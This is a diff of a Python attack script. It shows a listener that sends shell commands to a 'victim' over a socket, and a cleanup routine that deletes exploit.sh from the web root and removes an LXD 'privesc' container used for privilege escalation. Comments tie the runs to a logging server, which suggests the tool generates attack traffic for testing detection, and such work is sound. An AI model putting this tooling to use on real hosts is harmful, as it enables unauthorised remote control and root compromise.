@@ -100,7 +100,7 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 				command += '\n'
 				conn.send(command.encode())
 				time.sleep(0.4)
-				sys.stdout.write("\033[A" + ans.split("\n")[-1])
+				print(ans.split("\n")[-1])
 				print("", flush=True)
 			print('[DEBBUG] Exiting While')
 		else:
@@ -125,11 +125,12 @@ def listen(ip,port, t2, r_port, file_name, general_info, arguments, rep):
 		if conn:
 			print(color.YELLOW + '\n[-]' + color.END + ' Unbinding...')
 			# Cleanup
-			cleanup(conn, file_name, general_info, rep)
+			cleanup(conn, file_name, general_info, 0)
 			time.sleep(0.2)
 			conn.close()
 			s.close()
 	finally:
+		print(color.GREEN + '[*]' + color.END + ' Closing...')
 		conn.close()
 		# Not recommended to use this function, however even with sys.exit() the system hangs
 		if rep == 0:
@@ -226,7 +227,22 @@ def recvall(sock):
 
 
 def cleanup(conn, file_name, general_info, rep):
+	script_dir = os.path.dirname(os.path.realpath(__file__))
+	print('Rep: ', rep, 'Dir: ', script_dir)
 	conn.send('''cd $(grep -e DocumentRoot -R /etc/apache2/sites-enabled/ | awk '{ print $3 }') && rm -f *.tar.gz exploit.sh; lxc stop privesc && lxc delete privesc && lxc image delete alpine;\n'''.encode())
+	
+	# Only delete local files if it's the last repetition
+	# That way we avoid downloading k times the required software
+	# However we still delete the on the victim side because
+	# It is within our interest for the logging system to detect 
+	# the cleanup
+	if rep == 0:
+		if os.path.exists(script_dir + '/../' + file_name):
+			os.remove(script_dir + '/../' + file_name)
+		if os.path.exists(script_dir + '/../' + 'build-alpine'):
+			os.remove(script_dir + '/../' + 'build-alpine')
+
+
 	if general_info['active'] == 'True':
 		try:
 			requests.get('http://'+ informAudittingStop(general_info), timeout=(1,1))
@@ -235,16 +251,6 @@ def cleanup(conn, file_name, general_info, rep):
 		except requests.exceptions.ConnectTimeout:
 		    	sys.exit(color.RED + '[-]' + color.END + ' Failed to connect to Logging server')
 
-	# Only delete local files if it's the last repetition
-	# That way we avoid downloading k times the required software
-	# However we still delete the on the victim side because
-	# It is within our interest for the logging system to detect 
-	# the cleanup
-	if rep == 0:
-		if os.path.exists(file_name):
-			os.remove(file_name)
-		if os.path.exists('build-alpine'):
-			os.remove('build-alpine')
 
 
 def informAudittingStart(general_info):
